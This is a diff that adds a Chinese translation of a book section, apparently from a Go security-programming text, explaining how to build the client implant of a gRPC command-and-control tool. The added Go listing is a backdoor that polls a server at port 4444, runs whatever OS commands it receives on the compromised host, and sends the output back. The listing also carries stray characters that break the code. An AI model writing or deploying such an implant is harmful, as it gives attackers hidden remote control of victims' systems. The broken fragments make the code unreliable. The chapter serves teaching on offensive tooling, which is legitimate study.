@@ -217,3 +217,67 @@ func main() {
 至此，我们已经定义了 API 的实现并将它们注册为 gRPC 服务。 要做的最后一件事是，调用 `grpcImplantServer.Serve(implantListener)` 来启动植入服务。 在 goroutine 中执行此操作以防止代码阻塞。 毕竟，我们也要通过调用 `grpcAdminServer.Serve (adminListener)` 启动管理服务。
 
 现在服务端完成了，可以通过运行 `go run server/server.go` 来启动。 当然，还有东西和服务交互，因此也不会有任何响应。 让我们进入下一部分——植入端。
+
+
+## 创建客户端植入
+
+客户端植入被设计来运行在被破坏的系统上。 作为我们运行操作系统命令的后门。 这本例中，植入端定期轮询服务，请求工作。如果没有工作要做，什么也不会发生。否则，植入端执行操作系统命令并将输出返回给服务器。 
+
+清单14-4是 `implant/implant.go` 的内容。 
+
+```go
+func main() {
+	var
+	(
+		opts []grpc.DialOption
+		conn *grpc.ClientConn
+		err error
+		client grpcapi.ImplantClient
+	)
+
+	opts = append(opts, grpc.WithInsecure())
+	if conn, err = grpc.Dial(fmt.Sprintf("localhost:%d", 4444), opts...); err != nil { v
+		log.Fatal(err)
+	}
+	defer conn.Close()
+	client = grpcapi.NewImplantClient(conn) 
+
+	ctx := context.Background()
+	for { 
+		var req = new(grpcapi.Empty)
+		cmd, err := client.FetchCommand(ctx, req) y
+		if err != nil {
+			log.Fatal(err)
+		}
+		if cmd.In == "" {
+			// No work
+			time.Sleep(3*time.Second)
+			continue
+		}
+
+		tokens := strings.Split(cmd.In, " ") z
+		var c *exec.Cmd
+		if len(tokens) == 1 {
+			c = exec.Command(tokens[0])
+		} else {
+			c = exec.Command(tokens[0], tokens[1:]...)
+		}
+		buf, err := c.CombinedOutput(){
+		if err != nil {
+			cmd.Out = err.Error()
+		}
+		cmd.Out += string(buf)
+		client.SendOutput(ctx, cmd) 
+	}
+}
+``` 
+清单 14-4：创建植入端 (/ch-14/implant/implant.go)
+
+植入端代码只有一个 `main()` 函数。 从定义变量开始，包含一个 `grpcapi.ImplantClient` 类型。 `protoc` 命令自动地为我们创建这个类型。 该类型具有便利远程通信所需的所有RPC函数存根。 
+
+然后通过 `grpc.Dial(target string, opts... DialOption)` 建立连接，植入服务运行在4444端口。 调用 `grpcapi.NewImplantClient(conn)` （protoc 创建的函数）时使用这个连接。 现在有了 `gRPC` 客户端，应该已经建立了与植入服务器的连接。
+
+代码继续使用无限 `for loop` 轮询植入服务器，重复地查看是否有任务需要执行。 通过调用 `client.FetchCommand(ctx, req)` 来实现，将请求的上下文和 `Empt` 传递给该函数。 幕后是，该函数连接API服务。 如果收到的响应的 `cmd.In` 字段中没有任何东西，就暂停3秒后再重试。 当收到一个工作单元时，植入服务调用 `strings.Split(cmd.In, " ")` 命令分割为单个单词和参数。 这是必要的，因为Go执行操作系统命令的的语法是 `exec.Command(name, args...)`，`name` 是指要运行的命令，`args...` 是操作系统命令用到的子命令、标记和参数的列表。 Go这样做是为了防止操作系统命令注入，但是使执行变得复杂了，因为在执行前必须将命令分割成相关的部分。 通过运行`c.CombinedOutput()` 执行命令，并收集输出。 最后，我们获取该输出并向 `client.SendOutput(ctx, cmd)` 发起 gRPC 调用，将命令及其输出发送回服务器。 
+
+植入程序完成了，可以通过 `go run implant/implant.go` 运行。 应该会链接到服务器。 同样，这也是虎头蛇尾，因为还没有任务要做。 只是几个正在运行的进程，建立连接但没有做任何有意义的事情。
+让我们解决这个问题。
